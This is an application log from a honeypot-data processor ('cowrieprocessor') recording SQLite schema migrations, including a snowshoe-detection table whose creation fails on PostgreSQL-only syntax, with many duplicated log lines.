2025-10-18 18:32:59,033:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:59,033:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:59,033:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:59,033:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:59,033:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:59,033:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:59,033:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:59,035:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:59,035:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:59,035:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:59,035:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:59,035:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:59,035:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:59,035:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:59,035:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:59,035:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:59,035:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:59,037:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:59,037:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:59,037:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:59,037:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:59,037:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:59,037:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:59,037:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:59,037:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:59,037:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:59,037:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:59,039:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:59,039:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:59,039:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:59,039:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:59,039:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:59,039:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:59,039:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:59,039:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:59,039:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:59,039:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:59,041:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:59,041:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:59,041:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:59,041:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:59,041:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:59,041:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:59,041:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:59,041:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:59,041:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:59,041:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:59,043:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:59,043:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:59,043:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:59,043:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:59,043:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:59,043:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:59,043:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:59,043:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:59,043:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:59,043:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:59,045:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:59,045:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:59,045:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:59,045:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:59,045:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:59,045:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:59,045:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:59,045:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:59,045:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:59,045:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:59,047:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:59,047:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:59,047:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:59,047:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:59,047:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:59,047:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:59,047:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:59,047:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:59,047:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:59,047:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:59,052:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,052:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,052:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,052:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,052:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,052:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,052:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,052:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,052:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,052:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,054:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,054:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,054:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,054:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,054:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,054:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,054:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,054:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,054:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,054:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,056:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,056:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,056:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
